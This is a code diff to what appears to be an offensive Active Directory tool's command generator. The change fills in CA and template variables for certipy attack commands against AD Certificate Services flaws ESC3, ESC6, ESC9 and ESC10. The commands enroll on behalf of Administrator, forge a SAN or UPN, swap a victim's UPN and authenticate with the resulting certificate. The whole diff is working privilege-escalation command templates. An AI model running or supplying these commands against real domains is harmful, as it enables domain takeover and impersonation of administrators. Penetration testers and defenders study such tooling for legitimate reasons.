@@ -832,7 +832,7 @@ def get_commands(
                 f"ADCS ESC3 — Enrollment Agent template on {TF}. Request agent cert then on-behalf-of Administrator.",
                 [
                     f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -template '{AGENT_TEMPLATE}' -dc-ip {DC}",
-                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template 'User' -on-behalf-of '{D}\\Administrator' -pfx '{A}.pfx' -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -template '{TEMPLATE}' -on-behalf-of '{D}\\Administrator' -pfx '{A}.pfx' -dc-ip {DC}",
                     f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                 ],
             ), na
@@ -852,7 +852,7 @@ def get_commands(
             return CommandSet(
                 f"ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 set on CA {TF}. Any client cert template enrollment lets you supply a SAN.",
                 [
-                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<VULNERABLE_CA>' -template '<ENROLLABLE_TEMPLATE>' -upn 'Administrator@{D}' -sid '<ADMINISTRATOR_SID>' -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '{CA_NAME}' -template '{TEMPLATE}' -upn 'Administrator@{D}' -sid '<ADMINISTRATOR_SID>' -dc-ip {DC}",
                     f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                 ],
             ), na
@@ -864,7 +864,7 @@ def get_commands(
                     "# 1. Set victim's UPN to Administrator (or dnsHostName for ESC9b):",
                     f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn 'Administrator' -dc-ip {DC}",
                     "# 2. Enroll using victim:",
-                    f"certipy req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '<CA_NAME>' -template '<VULNERABLE_TEMPLATE>' -dc-ip {DC}",
+                    f"certipy req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '{CA_NAME}' -template '{TEMPLATE}' -dc-ip {DC}",
                     "# 3. Restore UPN, then auth:",
                     f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn '<ORIGINAL_UPN>' -dc-ip {DC}",
                     f"certipy auth -pfx '<VICTIM>.pfx' -domain {D} -dc-ip {DC}",
@@ -876,7 +876,7 @@ def get_commands(
                 "ADCS ESC10 — weak certificate mapping on DC. Same workflow as ESC9 (UPN/dnsHostName swap).",
                 [
                     f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn 'Administrator' -dc-ip {DC}",
-                    f"certipy req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '<CA_NAME>' -template '<VULNERABLE_TEMPLATE>' -dc-ip {DC}",
+                    f"certipy req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '{CA_NAME}' -template '{TEMPLATE}' -dc-ip {DC}",
                     f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn '<ORIGINAL_UPN>' -dc-ip {DC}",
                     f"certipy auth -pfx '<VICTIM>.pfx' -domain {D} -dc-ip {DC}",
                 ],
